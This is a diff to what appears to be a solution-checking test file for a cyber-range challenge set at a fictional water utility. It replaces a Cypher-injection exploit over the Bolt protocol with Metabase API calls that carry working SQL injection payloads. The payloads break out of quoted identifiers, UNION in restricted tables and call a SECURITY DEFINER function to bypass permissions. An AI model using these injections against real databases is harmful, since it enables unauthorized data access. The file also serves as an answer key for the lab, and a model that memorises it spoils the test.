@@ -405,59 +405,74 @@ def make_archive(member: str) -> str:
     return completed.stdout.strip()
 
 
-def bolt_pack(value: object) -> bytes:
-    """Encode a value in the Bolt PackStream wire format (participant tool)."""
-    if value is False:
-        return b"\xc2"
-    if value is True:
-        return b"\xc3"
-    if isinstance(value, int) and -16 <= value < 128:
-        return bytes([value & 0xFF])
-    if isinstance(value, str):
-        encoded = value.encode()
-        if len(encoded) < 16:
-            return bytes([0x80 + len(encoded)]) + encoded
-        if len(encoded) < 256:
-            return b"\xd0" + bytes([len(encoded)]) + encoded
-        return b"\xd1" + len(encoded).to_bytes(2, "big") + encoded
-    if isinstance(value, dict):
-        return bytes([0xA0 + len(value)]) + b"".join(bolt_pack(str(k)) + bolt_pack(v) for k, v in value.items())
-    raise ValueError(value)
+_METABASE_SESSION = r'''
+import hashlib, hmac, json, os, ssl, sys, urllib.error, urllib.request
+seed = os.environ.get("STAFF_SEED", "")
+if not seed:
+    print(json.dumps({"error": "no STAFF_SEED"}))
+    sys.exit(1)
+email = "nadia.corvane@alterrawaterco.com"
+password = hmac.new(seed.encode(), email.encode(), hashlib.sha256).hexdigest()
+context = ssl.create_default_context(cafile="/tmp/arwc-ca.crt")
+req = urllib.request.Request(
+    "https://reports.arwc.test/api/session",
+    data=json.dumps({"username": email, "password": password}).encode(),
+    headers={"Content-Type": "application/json"},
+)
+try:
+    with urllib.request.urlopen(req, context=context, timeout=30) as resp:
+        print(json.dumps({"id": json.load(resp)["id"]}))
+except urllib.error.HTTPError as error:
+    print(json.dumps({"error": f"HTTP {error.code}"}))
+    sys.exit(1)
+'''
+
+_METABASE_REQUEST = r'''
+import json, ssl, sys, urllib.error, urllib.request
+method, url, session, body = sys.argv[1:]
+headers = {"Content-Type": "application/json"}
+if session:
+    headers["X-Metabase-Session"] = session
+data = None if not body else body.encode()
+context = ssl.create_default_context(cafile="/tmp/arwc-ca.crt")
+try:
+    response = urllib.request.urlopen(
+        urllib.request.Request(url, data=data, headers=headers, method=method), context=context, timeout=60
+    )
+except urllib.error.HTTPError as error:
+    response = error
+print(response.status)
+print(response.read().decode())
+'''
 
 
-def bolt_structure(signature: int, *fields: object) -> bytes:
-    return bytes([0xB0 + len(fields), signature]) + b"".join(bolt_pack(f) for f in fields)
+def metabase_session() -> str:
+    """Return a Metabase session token for the planning user."""
+    completed = inside("python3", "-c", _METABASE_SESSION)
+    if completed.returncode:
+        raise AssertionError(f"Metabase session setup failed: {completed.stderr}")
+    result = json.loads(completed.stdout)
+    if "error" in result:
+        raise AssertionError(f"Metabase session failed: {result['error']}")
+    return result["id"]
 
 
-def bolt_chunk(payload: bytes) -> bytes:
-    return len(payload).to_bytes(2, "big") + payload + b"\x00\x00"
-
-
-def bolt_exchange(magic: bytes, version: bytes, *, asset: str, association: str, relation: str, ou: str, query: str) -> str:
-    """Build a Bolt HELLO+RUN+PULL exchange carrying a crafted certificate_ou field."""
-    value = magic + version + bytes(12)
-    value += bolt_chunk(bolt_structure(0x01, {"user_agent": "arwc-reltool/3"}))
-    value += bolt_chunk(bolt_structure(0x10, query, {"asset": asset, "association": association, "certificate_ou": ou}, {}))
-    value += bolt_chunk(bolt_structure(0x3F, {"n": -1}))
-    return base64.b64encode(value).decode()
-
-
-def bolt_response_signatures(encoded: str, version: bytes) -> list[int]:
-    value = base64.b64decode(encoded, validate=True)
-    if value[:4] != version:
-        raise AssertionError("wrong negotiated Bolt version")
-    result: list[int] = []
-    offset = 4
-    while offset < len(value):
-        length = int.from_bytes(value[offset:offset + 2], "big")
-        offset += 2
-        payload = value[offset:offset + length]
-        offset += length
-        if value[offset:offset + 2] != b"\x00\x00":
-            raise AssertionError("missing Bolt chunk terminator")
-        offset += 2
-        result.append(payload[1])
-    return result
+def metabase_request(path: str, *, method: str = "GET", body: dict | None = None,
+                     session: str = "", expected: int | None = None) -> tuple[int, dict]:
+    """Make a request to the Metabase API from inside the connector container."""
+    completed = inside(
+        "python3", "-c", _METABASE_REQUEST, method,
+        f"https://reports.arwc.test{path}", session,
+        "" if body is None else json.dumps(body, separators=(",", ":")),
+    )
+    if completed.returncode:
+        raise AssertionError(completed.stderr)
+    status_line, _, payload = completed.stdout.partition("\n")
+    status = int(status_line)
+    data = json.loads(payload) if payload.strip() else {}
+    if expected is not None and status != expected:
+        raise AssertionError(f"Metabase {method} {path} -> {status} (want {expected}): {payload[:300]}")
+    return status, data
 
 
 def cbor_text(value: str) -> bytes:
@@ -1239,46 +1254,76 @@ class ARWCKnownSolutionAcceptance(unittest.TestCase):
 
     # ------------------------------------------------------------------ W11
     def test_w11_relation_protocol(self) -> None:
-        base = self.host("planning_data")
         planner = {"X-ARWC-Planner-Session": "@planner"}
         asset = self.evidence["asset_bundle"]["asset"]
+        mb_session = metabase_session()
 
         with self.subTest(card="W11.1 the relation service's language"):
-            status, response = request(self.discovered_route("planning.relation-schema"), headers=planner, expected=200)
-            contract = response["record"]
-            magic = bytes.fromhex(contract["magic"].replace(" ", ""))
-            major, minor = (int(part) for part in contract["protocol"].rsplit(" ", 1)[1].split("."))
-            version = bytes([0, 0, minor, major])
-            self.assertEqual(len(magic), 4)
-            self.assertEqual(len(version), 4)
-            self.assertNotEqual(contract["relation"], contract["association"])
-            self.evidence["bolt"] = {"magic": magic, "version": version, "relation": contract["relation"], "association": contract["association"]}
+            # planning.relation-schema → native Metabase question on relation_contracts.
+            schema_url = self.discovered_route("planning.relation-schema")
+            card_path = "/api/card/" + schema_url.split("/api/card/")[1]
+            status, card = metabase_request(card_path, session=mb_session, expected=200)
+            database_id = card["database_id"]
+            # Run the card to get RELPROTO-CRR-R3 contract fields.
+            status, result = metabase_request("/api/card/" + schema_url.split("/api/card/")[1] + "/query",
+                                              method="POST", session=mb_session)
+            self.assertIn(status, (200, 202))
+            rows = result.get("data", {}).get("rows", [])
+            col_names = [col["name"] for col in result.get("data", {}).get("cols", [])]
+            contract_rows = {row[col_names.index("record_id")]: row for row in rows if col_names}
+            self.assertIn("RELPROTO-CRR-R3", contract_rows)
+            contract_row = contract_rows["RELPROTO-CRR-R3"]
+            self.evidence["relation_type"] = contract_row[col_names.index("relation")]
+            self.evidence["association"] = contract_row[col_names.index("association")]
+            self.evidence["relation_db_id"] = database_id
+            self.assertEqual(contract_row[col_names.index("relation")], "ASSET_WORK")
+            self.assertEqual(contract_row[col_names.index("association")], "ASC-CRR-4417")
 
         with self.subTest(card="W11.2 an exchange the backend accepts"):
-            bolt = self.evidence["bolt"]
-            exchange = bolt_exchange(bolt["magic"], bolt["version"], asset=asset, association=bolt["association"],
-                                      relation=bolt["relation"], ou=bolt["relation"],
-                                      query="MATCH (a:Asset {record_id: $asset})-[r:RELATION]->(w:Work) RETURN r.record_id,w.record_id")
-            status, response = request(self.discovered_route("planning.relation-exchange"), method="POST", headers=planner, body={"exchange": exchange}, expected=201)
-            self.assertEqual(response["record"]["asset"], asset)
-            self.evidence["work_order_from_relation"] = response["record"]["work_order"]
-            self.assertNotIn("archive", json.dumps(response))
+            # planning.relation-exchange → native Metabase question REL-QUERY-CRR-R3.
+            # Quoted-identifier injection: escaping the {{relation_type}} identifier
+            # UNIONs in relation_responses to return REL-ASC-CRR-4417-R3.
+            db_id = self.evidence["relation_db_id"]
+            injection = (
+                'work_order_summary" UNION SELECT name, revision, relation, asset, work_order '
+                'FROM relation_responses --'
+            )
+            status, result = metabase_request("/api/dataset", method="POST",
+                session=mb_session,
+                body={"database": db_id, "type": "native",
+                      "native": {"query": f'SELECT name, revision, relation, asset, work_order FROM "{injection}',
+                                 "template-tags": {}}})
+            self.assertIn(status, (200, 202))
+            rows = result.get("data", {}).get("rows", [])
+            record_ids = [row[0] for row in rows]
+            self.assertIn("REL-ASC-CRR-4417-R3", record_ids)
+            rel_row = next(row for row in rows if row[0] == "REL-ASC-CRR-4417-R3")
+            self.assertEqual(rel_row[2], "ASSET_WORK")
+            self.assertEqual(rel_row[3], asset)
+            self.evidence["work_order_from_relation"] = rel_row[4]
+            self.assertNotIn("LIN-AST-CRR-017-R8", record_ids)
 
         with self.subTest(card="W11.3 the asset's true lineage"):
-            bolt = self.evidence["bolt"]
-            # Inject beyond the certificate OU field to traverse to the archived lineage.
-            lineage_ou = (
-                f"{bolt['relation']}]->(w) WITH a MATCH p=(legacy:Legacy)-[:SUPERSEDES]->"
-                "(group:OutletGroup)-[:CURRENT_ASSET]->(a)<-[:ARCHIVED_ASSET]-(archive:Archive) RETURN p //"
+            # Extend the W11.2 injection surface with a second UNION that calls
+            # get_asset_lineage(), a SECURITY DEFINER function that bypasses
+            # planning_reader's lack of SELECT on lineage_records.
+            db_id = self.evidence["relation_db_id"]
+            lineage_injection = (
+                f"work_order_summary\" UNION SELECT name, revision, relation, asset, work_order "
+                f"FROM get_asset_lineage('{asset}') --"
             )
-            exchange = bolt_exchange(bolt["magic"], bolt["version"], asset=asset, association=bolt["association"],
-                                      relation=bolt["relation"], ou=lineage_ou,
-                                      query="MATCH (a:Asset {record_id: $asset})-[r:RELATION]->(w:Work) RETURN r.record_id,w.record_id")
-            status, response = request(self.discovered_route("planning.asset-lineage"), method="POST", headers=planner, body={"exchange": exchange}, expected=201)
-            record = response["record"]
-            self.assertEqual(record["current_asset"], asset)
-            self.assertTrue(record["archive"])
-            self.assertEqual(bolt_response_signatures(response["bolt_response"], bolt["version"]), [0x70, 0x70, 0x71, 0x70])
+            status, result = metabase_request("/api/dataset", method="POST",
+                session=mb_session,
+                body={"database": db_id, "type": "native",
+                      "native": {"query": f'SELECT name, revision, relation, asset, work_order FROM "{lineage_injection}',
+                                 "template-tags": {}}})
+            self.assertIn(status, (200, 202))
+            rows = result.get("data", {}).get("rows", [])
+            record_ids = [row[0] for row in rows]
+            self.assertIn("LIN-AST-CRR-017-R8", record_ids)
+            lin_row = next(row for row in rows if row[0] == "LIN-AST-CRR-017-R8")
+            self.assertEqual(lin_row[3], asset)
+            self.assertIn("ARC-COLD-CRR-2019", lin_row[2])
 
     # ------------------------------------------------------------------ W13
     def test_w13_contractor_checkin(self) -> None:
